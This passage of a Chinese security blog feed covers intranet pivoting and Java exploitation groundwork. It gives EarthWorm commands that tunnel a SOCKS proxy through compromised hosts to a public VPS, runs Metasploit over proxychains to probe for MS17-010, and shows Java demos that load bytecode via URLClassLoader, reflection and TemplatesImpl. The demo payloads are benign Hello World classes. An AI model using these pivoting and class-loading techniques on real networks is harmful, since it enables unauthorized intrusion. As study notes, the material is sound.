src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/4.png"></p><p>2.接着将EW上传到B主机上，利用ssocksd方式启动1080端口的SOCKS代理服务，命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>3.最后将EW上传到A主机上，执行如下命令：该命令的意思是在主机上利用<code>lcx_slave</code>方式，将公网VPS的6666端口和B主机的1080端口连接起来。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d <span class="hljs-number">49</span>.*.*.<span class="hljs-number">234</span> -e <span class="hljs-number">6666</span>  -f <span class="hljs-number">172.16.55.141</span>(B主机) -g <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><h3 id="5-三级网络环境"><a href="#5-三级网络环境" class="headerlink" title="5.三级网络环境"></a>5.三级网络环境</h3><p>​    假设现在获取了内网环境中三台主机（分别为A主机和B主机，以及C主机）的权限，A主机配有一张内网网卡，可以访问B主机以及外网。B主机可以访问C主机，但是无法访问外网。C主机可以访问核心区域，同时可以被B主机访问。</p><p>VPS主机：<code>49.*.*.234</code></p><p>A主机：内网IP——&gt;172.16.55.135，只能访问B主机和外网，不能访问其他资源。</p><p>B主机：有内网IP—–&gt;172.16.55.141 只可以访问C主机。</p><p>C主机：有内网IP—–&gt;172.16.55.126，只可以访问核心区域。</p><p>实验目标：在C主机上搭建SOCKS代理服务，让攻击者可以访问内网中的核心区域。</p><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到VPS上，执行如下命令：将1080端口受到的代理请求转发到13443端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">13443</span><br></code></pre></td></tr></table></figure><p>2.将EW上传到A主机上，执行如下命令：将公网VPS的13443端口和B主机上的999端口连接起来。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d <span class="hljs-number">49</span>.*.*.<span class="hljs-number">240</span> -e <span class="hljs-number">13443</span> -f <span class="hljs-number">172.16.55.141</span> -g <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure><p>3.将EW上传到B主机上，执行如下命令：将999端口受到的代理请求转发到777端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">999</span> -e <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure><p>4.将EW上传到C主机上，并执行如下命令：在C主机上启动SOCKS 5服务，并反弹到B主机的777端口上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d <span class="hljs-number">172.16.55.141</span> -e <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure><p>现在，就可以通过访问公网VPS（<code>49.*.*.234</code>）的1080端口使用C主机上架设的SOCKS 5 代理了。</p><h1 id="3-使用ProxyChains（Linux）使用架设的SOCKS代理"><a href="#3-使用ProxyChains（Linux）使用架设的SOCKS代理" class="headerlink" title="3.使用ProxyChains（Linux）使用架设的SOCKS代理"></a>3.使用ProxyChains（Linux）使用架设的SOCKS代理</h1><h4 id="使用步骤："><a href="#使用步骤：" class="headerlink" title="使用步骤："></a>使用步骤：</h4><p>1.安装<code>proxychains</code>。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install proxychains<br></code></pre></td></tr></table></figure><p>2.启用<code>dynamic_chain</code></p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/5.png"></p><p>3.修改<code>/etc/proxychains.conf</code>里的SOCKS代理服务器的IP以及端口</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/6.png"></p><p>4.利用<code>proxyresolv</code>命令测试代理服务器是否正常。</p><p>首先将该命令复制到<code>/usr/bin/</code>目录下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cp <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/proxychains3/</span>proxyresolv <span class="hljs-regexp">/usr/</span>bin/<br></code></pre></td></tr></table></figure><p>测试命令。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">proxyresolv</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/7.png"></p><p>代理服务器上的数据转发正常</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/8.png"></p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/9.png"></p><p>5.尝试使用代理启动MSF</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/10.png"></p><p>成功利用SOCKS 5代理对内网的主机进行MS17-010漏洞探测。</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/11.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-SOCKS代理简介&quot;&gt;&lt;a href=&quot;#1-SOCKS代理简介&quot; class=&quot;headerlink&quot; title=&quot;1.SOCKS代理简介&quot;&gt;&lt;/a&gt;1.SOCKS代理简介&lt;/h1&gt;&lt;p&gt;​    SOCKS是一种代理服务，可以简单的将系统的一端连接到另一</summary>
      
    
    
    
    <category term="内网安全" scheme="https://reader-l.github.io/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-Java动态加载字节码方法</title>
    <link href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/"/>
    <id>https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/</id>
    <published>2021-04-04T09:38:23.000Z</published>
    <updated>2021-04-05T11:20:31.097Z</updated>
    
    <content type="html"><![CDATA[<p>​    本篇文章依旧是参照代码审计的知识星球里的《JAVA安全漫谈系列》的文章。</p><h1 id="1-什么是Java的字节码"><a href="#1-什么是Java的字节码" class="headerlink" title="1.什么是Java的字节码"></a>1.什么是Java的字节码</h1><p>​    Java刚诞生的时候曾经提过一个非常著名的宣传口号: “一次编写，到处运行”。为了实现该目的，Sun公司以及其他虚拟机提供商发布了许多可以运行在不同平台上的JVM虚拟机，而这些虚拟机都拥有一个共同的功能，那就是可以载入和执行同一种与平台无关的字节码(ByteCode)。 于是，我们的源代码不再必须根据不同平台翻译成0和1，而是间接翻译成字节码，储存字节码的文件再交由运行于不同平台上的JVM虚拟机去读取执行，从而实现一次编写，到处运行的目的。<br>​    源代码中的各种变量，关键字和运算符号的语义最终都会编译成多条字节码命令。而字节码命令所能提供的语义描述能力是要明显强于Java本身的，所以有其他一些同样基于JVM的语言能提供许多Java所不支持的语言特性。</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/1.png"></p><blockquote><p>但是，本文中所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。所以，如果你阅读到后面，发现我讲的不是狭义的“Java字节码”，请不要有疑虑。</p></blockquote><h1 id="2-利用URLClassLoader加载远程class文件"><a href="#2-利用URLClassLoader加载远程class文件" class="headerlink" title="2.利用URLClassLoader加载远程class文件"></a>2.利用URLClassLoader加载远程class文件</h1><pre><code> ClassLoader是一个加载器，告诉java虚拟机如何加载指定类的，java默认的ClassLoader就是根据类名来加载类，**这个类名得是类的完整路径**，比如：java.lang.Runtime。</code></pre><p>​    同时java的ClassLoader是用来加载字节码文件最基础的方法。</p><p>​    正常情况下，Java会根据配置项 <code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><p>​        1.URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件。<br>​        2.URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件。<br>​        3.URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类。</p><p>​    咱主要的注意力在第三点：利用基础的<code>Loader</code>类来寻找类，而要利用这一点必须是非<code>file</code>协议的情况下—-JAVA默认提供了对<code>file,ftp,gopher,http,https,jar,mailto,netdoc</code>协议的支持。</p><p>​    以下的Demo用HTTP协议来进行测试，从远程HTTP服务器上加载<code>.class</code>文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoadHttpRemote</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException </span>&#123;<br>        <span class="hljs-comment">//注意url结尾需要有斜杠</span><br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://localhost:8080/&quot;</span>)&#125;;<br>        URLClassLoader loader = URLClassLoader.newInstance(urls);<br>        Class c= loader.loadClass(<span class="hljs-string">&quot;hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以编译一个简单的HelloWorld程序，放在 <a href="http://localhost:8000/hello.class">http://localhost:8000/hello.class</a> ：</p><p>​    因此，作为攻击者，只要我们能够控制目标<code>Java ClassLoader</code>的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。</p><h1 id="3-利用ClassLoader-defineClass直接加载字节码"><a href="#3-利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="3.利用ClassLoader#defineClass直接加载字节码"></a>3.利用ClassLoader#defineClass直接加载字节码</h1><p>​    其实java不管是加载远程的class文件，还是本地的class或者jar文件，都是要经历下面三个方法调用的：</p><p>（p神的图）</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/2.png"></p><p>其中：<br>    1.loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass。<br>    2.findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass。<br>    3.defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类。</p><p>由于ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefineClassTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//利用反射来调用。</span><br>        Class clas = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        Method defineclass = clas.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>        defineclass.setAccessible(<span class="hljs-keyword">true</span>);<br>        String base64_code = <span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA\n&quot;</span> +<br>            <span class="hljs-string">&quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs\n&quot;</span> +<br>            <span class="hljs-string">&quot;bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh\n&quot;</span> +<br>            <span class="hljs-string">&quot;L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry\n&quot;</span> +<br>            <span class="hljs-string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n\n&quot;</span> +<br>            <span class="hljs-string">&quot;OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA\n&quot;</span> +<br>            <span class="hljs-string">&quot;AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>;<br>        BASE64Decoder base64Decoder = <span class="hljs-keyword">new</span> BASE64Decoder();<br>        <span class="hljs-keyword">byte</span>[] code = base64Decoder.decodeBuffer(base64_code);<br>        Class Hello = (Class)defineclass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        Hello.newInstance();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>​    这里需要注意的是，<code>ClassLoader#defineClass</code>返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令。</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/3.png"></p><p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p><h1 id="4-利用TemplatesImpl加载字节码"><a href="#4-利用TemplatesImpl加载字节码" class="headerlink" title="4.利用TemplatesImpl加载字节码"></a>4.利用TemplatesImpl加载字节码</h1><p>在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影。因此也是我们学习的目标。虽然大部分上层开发者不会直接使用到<code>defineClass</code>方法，同时<code>java.lang.ClassLoader</code>的<code>defineClass</code>方法作用域是不开放的（<code>protected</code>），但是Java底层还是有一些类用到了它，就是 <code>TemplatesImpl </code>。不然也没有学习他的必要了。</p><p>这个<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类里面定义了一个内部类：<code>TransletClassLoader</code></p><p>可以看到这个类是继承<code>ClassLoader</code>的，同时它也重写了<code>defineClass</code>方法，并且没有显式地定义方法的作用域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的<code>defineClass</code>由其父类的protected类型变成了一个default类型的方法，可以被类外部调用。</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/4.png"></p><p>下面是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中关于<code>TransletClassLoader#defineClass()</code>的调用栈。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt;<br>TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>追到最前面两个方法 <code>TemplatesImpl#getOutputProperties() </code>、<code>TemplatesImpl#newTransformer()</code> ，这两者的作用域是public，可以被外部调用。我们尝试用<code>newTransformer()</code> 构造一个简单的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-keyword">byte</span>[] code =<br>            <span class="hljs-keyword">new</span> BASE64Decoder().decodeBuffer(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA&quot;</span>+<br>                <span class="hljs-string">&quot;CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP&quot;</span>+<br>                <span class="hljs-string">&quot;TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0&quot;</span>+<br>                <span class="hljs-string">&quot;aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm&quot;</span>+<br>                <span class="hljs-string">&quot;KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y&quot;</span>+<br>                <span class="hljs-string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw&quot;</span>+<br>                <span class="hljs-string">&quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp&quot;</span>+<br>                <span class="hljs-string">&quot;bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb&quot;</span>+<br>                <span class="hljs-string">&quot;DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB&quot;</span>+<br>                <span class="hljs-string">&quot;AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj&quot;</span>+<br>                <span class="hljs-string">&quot;dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z&quot;</span>+<br>                <span class="hljs-string">&quot;bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot;</span>+<br>                <span class="hljs-string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot;</span>+<br>                <span class="hljs-string">&quot;OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA&quot;</span>+<br>                <span class="hljs-string">&quot;AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA&quot;</span>+<br>                <span class="hljs-string">&quot;AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA&quot;</span>+<br>                <span class="hljs-string">&quot;DwABABAAAAACABE=&quot;</span>);<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/5.png"></p><p>​    这里我设置了三个属性：<code> _bytecodes</code>、<code> _name</code>和<code>_tfactory</code>。<code> _bytecodes</code> 是由字节码组成的数组；<code> _name</code> 可以是任意字符串，只要不为null即可；<code>_tfactory </code>需要是一个 <code>TransformerFactoryImpl </code>对象，因为<code>TemplatesImpl#defineTransletClasses() </code>方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。至于为何要设置这些属性，具体的分析可以看这篇文章：</p><p>大木头师傅的文章<a href="http://wjlshare.com/archives/1509">Java反序列化-CommonsCollections2分析</a></p><p>​    另外，值得注意的是，<code>TemplatesImpl</code>中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateImplTarget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> TransletException </span>&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="hljs-function"><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplateImplTarget</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img 